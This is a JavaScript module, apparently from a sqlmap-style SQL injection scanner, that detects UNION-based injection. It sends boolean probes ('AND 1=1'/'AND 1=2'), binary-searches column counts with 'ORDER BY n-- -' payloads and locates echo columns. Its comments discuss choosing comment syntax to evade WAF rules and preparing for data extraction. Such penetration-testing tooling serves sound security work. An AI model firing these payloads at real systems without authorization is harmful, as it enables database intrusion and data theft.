// =====================================================================
// UnionDetector.js —— UNION 注入检测器
// =====================================================================
import { Detector } from '../Detector.js';
import { createDetectionResult } from '../models.js';
import { binaryGuessColumns } from '../columnGuess.js';
import { _colGuessCache, colGuessScopeKey } from '../Extractor.js';
import { discoverEchoColumnsDetailed } from '../injection.js';

// 假阳性门控：参数反射会「原样回显」注入串，导致标记出现在响应即可误报 UNION。
// sqlmap 的做法是先在注入存在性层面确认参数在 SQL 上下文（布尔/报错/时间任一分化），
// 再谈 UNION 回显列定位。此处用一对真假布尔探针作最低成本存在性证明：
//   真探针  {orig} AND 1=1  → 与基线相似（SQL 上下文中恒真）
//   假探针  {orig} AND 1=2  → 与基线性差异/失败（恒假改变结果）
// 参数反射目标（参数只是被当作文本回显）→ 真假探针都只是「输入串变长」，
// 与基线长度差超过容差 → 双双判定不相似 → 门控拒绝 → 不误报。
export class UnionDetector extends Detector {
  constructor() {
    super('union');
  }

  // 布尔探针相似判定（与 BooleanBlindDetector._similar 同套容差逻辑的轻量版）
  // 布尔探针相似判定：字符级差异率（比 LCP 对反射目标更鲁棒——中段 1 个字符差异 + 时间戳
  // 噪声不会让 LCP 崩塌，差异计数准确反映「仅 1 字符不同的反射特征」）。
  _similar(a, b) {
    if (a === b) return true;
    const la = a.length, lb = b.length;
    if (Math.abs(la - lb) > Math.max(24, lb * 0.12)) return false;
    const m = Math.min(la, lb);
    let diffs = 0;
    for (let i = 0; i < m; i++) { if (a[i] !== b[i]) diffs++; }
    if (diffs + Math.abs(la - lb) >= Math.max(la, lb) * 0.15) return false;
    return true;
  }

  /**
   * 注入存在性门控：参数必须证明在 SQL 上下文，才继续 UNION 回显定位。
   *
   * 核心区分（真假探针互相比较，而非各自比基线）：
   *   反射目标：`Results for: ... AND 1=1` vs `... AND 1=2` → 结构高度相似（仅末尾 1 字符不同）→ 拒绝
   *   真实注入：`HAS_RESULTS` vs `NO_RESULTS` → 互相不相似（SQL 真假分化改变响应）→ 通过
   *   无信号：真假都返回基线相同内容 → 相似 → 拒绝
   *
   * 用与 BooleanBlindDetector._similar 同套容差（LCP 85% + 分块兜底）。
   * @returns {Promise<boolean>} true=存在注入现象（通过门控）
   */
  async _gateInjection(ctx, httpClient, target, point, boundary) {
    const orig = point.originalValue || '1';
    // [P0-FIX] 注释符选择：tamper 开启时用 `/*`（MySQL/SQLite/PG 未闭合块注释，延伸至查询末尾），
    // 避免 `--` 被 WAF 的 comment_dash 规则拦截（charencode 的 URL 编码经 Express 解码后 `--` 仍存在）。
    // tamper 关闭时用 `-- -`（标准行注释，兼容全库）。
    const commentSuffix = ctx.config?.wafEvasion?.tamper?.enabled ? '/*' : '-- -';
    // 真探针：AND 1=1（SQL 上下文中恒真）
    const trueBody = String((await this.send(
      httpClient, ctx,
      this.buildRequest(target, point, this.obfuscateValue(ctx, `${orig}${boundary} AND 1=1${commentSuffix}`)),
      ctx
    ))?.data ?? '');
    // 假探针：AND 1=2（SQL 上下文中恒假，应改变响应）
    const falseBody = String((await this.send(
      httpClient, ctx,
      this.buildRequest(target, point, this.obfuscateValue(ctx, `${orig}${boundary} AND 1=2${commentSuffix}`)),
      ctx
    ))?.data ?? '');
    // 真假互相不相似 = 注入信号（SQL 真假分化改变了响应）
    // 真假互相相似 = 反射（输入只是文本回显，结构相同）或无注入
    return !this._similar(trueBody, falseBody);
  }

  /**
   * @param {object} ctx { httpClient, target, point, dbms, config }
   * @returns {Promise<import('../models.js').DetectionResult>}
   */
  async detect(ctx) {
    const { httpClient, target, point, dbms } = ctx;
    const result = createDetectionResult(point.id, 'union');
    const maxCols = ctx.config?.maxColumnsGuess ?? 50;
    // [P2-5] --union-cols：用户给定列数（跳过 ORDER BY 二分；0/缺省自动猜测）
    const unionCols = ctx.config?.unionCols ? Number(ctx.config.unionCols) : 0;
    // ★FIX-1：闭合前缀（probeBoundary 探测结果，字符串上下文注入点必需）
    const boundary = point.boundary || '';

    // 基线响应长度，用于判断 ORDER BY 是否超出列数
    const baseReq = this.buildRequest(target, point, point.originalValue || '1');
    const baseline = await this.send(httpClient, ctx, baseReq, ctx);
    const baseLen = String(baseline?.data ?? '').length;

    // 注入存在性门控（防参数反射误报；可经 config.unionSkipGate 关闭）
    // 直连模式（-d）：SQL 模板为自建，参数直进 SQL 无「应用反射输入」概念 → 跳过门控
    const isDirect = target?.mode === 'direct';
    const gateEnabled = !isDirect && ctx.config?.unionSkipGate !== true;
    if (gateEnabled) {
      const pass = await this._gateInjection(ctx, httpClient, target, point, boundary);
      if (!pass) {
        return result; // vulnerable=false，不误报
      }
    }

    // 1) 猜列数（ORDER BY 二分，请求数 ~log2(maxCols)，取代线性扫描）
    const columns = await binaryGuessColumns(
      (n) =>
        this.send(
          httpClient,
          ctx,
          this.buildRequest(
            target,
            point,
            this.obfuscateValue(ctx, `${point.originalValue || '1'}${boundary} ORDER BY ${n}-- -`)
          ),
          ctx
        ),
      { baseLen, maxCols, cache: _colGuessCache, cacheKey: colGuessScopeKey(target, point?.id), fixed: unionCols }
    );

    // 2) 用标记字符串定位回显列（文本标记优先；严格类型库 / INT 回显列自动落数字标记双族交叉确认）
    // 修复对标 sqlmap 差距 D3：'SQLISCANNER<i>' 落在 INT 列上在 MSSQL/Oracle/PG 报类型错误 → 原先完全漏检
    const located = await discoverEchoColumnsDetailed(httpClient, ctx, columns, boundary);
    const unionPayload = located.evidencePayload;
    const hitCols = located.cols.length > 0 ? located.cols : located.numericCols;

    if (hitCols.length > 0) {
      result.vulnerable = true;
      result.dbms = dbms;
      const styleNote = located.style === 'numeric' ? '，数值型回显列（INT 兼容）' : '';
      result.evidence = `UNION 注入成功，回显列：${hitCols.join(',')}（列数 ${columns}${styleNote}）`;
      result.payloads = [unionPayload, `${point.originalValue || '1'}${boundary} ORDER BY ${columns}-- -`];
      point.confirmed = true;
      point.technique = 'union';
      point.dbms = dbms;
      // 记录回显列与列数，供 Extractor/DBFingerprinter 复用（避免各自硬编第 2 列）
      // 注意：echoCols 保持「可回显文本的列」语义（数值列无法回显文本，拖库/版本提取不可用）；
      // 仅数值回显命中时置空数组——UNION 注入本身已确认（confirmed=true），但提取走不了文本列
      point.echoCols = located.cols;
      point.columns = columns;
    }
    return result;
  }
}

export default UnionDetector;
